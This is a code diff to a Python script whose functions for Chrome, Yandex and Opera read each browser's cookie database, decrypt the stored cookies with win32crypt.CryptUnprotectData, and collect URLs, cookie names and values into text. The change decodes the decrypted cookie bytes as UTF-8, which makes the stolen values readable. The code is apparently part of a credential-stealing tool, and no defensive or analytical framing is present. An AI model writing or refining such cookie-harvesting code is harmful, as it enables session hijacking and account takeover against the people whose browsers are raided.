@@ -17,7 +17,7 @@ def chrome():
         for result in cursor.fetchall():
             cookies = win32crypt.CryptUnprotectData(result[0], None, None, None, 0)[1]
             if cookies:
-               textc = textc + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + str(cookies)
+               textc = textc + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + cookies.decode("utf-8")
     except:
         return "no chrome"
 
@@ -38,7 +38,7 @@ def yandex():
         for result in cursor.fetchall():
             cookies = win32crypt.CryptUnprotectData(result[0], None, None, None, 0)[1]
             if cookies:
-                texty = texty + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + str(cookies)
+                texty = texty + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + cookies.decode("utf-8")
     except:
         return "no yandex"
     #print(texty)
@@ -57,7 +57,7 @@ def opera():
         for result in cursor.fetchall():
             cookies = win32crypt.CryptUnprotectData(result[0], None, None, None, 0)[1]
             if cookies:
-                texto = texto + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + str(cookies)
+                texto = texto + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + cookies.decode("utf-8")
     except:
         return "no opera"
     #print(texto)
